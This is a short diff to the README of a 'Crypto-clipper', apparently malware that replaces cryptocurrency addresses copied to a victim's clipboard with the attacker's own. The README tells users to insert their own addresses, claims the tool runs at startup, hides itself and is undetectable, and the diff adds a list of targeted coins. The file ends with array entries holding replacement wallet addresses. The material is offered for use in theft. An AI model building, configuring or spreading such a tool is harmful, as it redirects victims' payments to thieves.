@@ -1,6 +1,13 @@
 # Crypto-clipper-
 change this to your adress its also work instart up and its fud hidin 
 
+btc
+eth
+ltc
+xmr
+usdt trc20
+xrp 
+
 DataSet1(0) = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
 DataSet1(1) = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
 DataSet1(2) = "LQhefmrXTe72gg9oYkrvMaMKpeeR9oEUti"
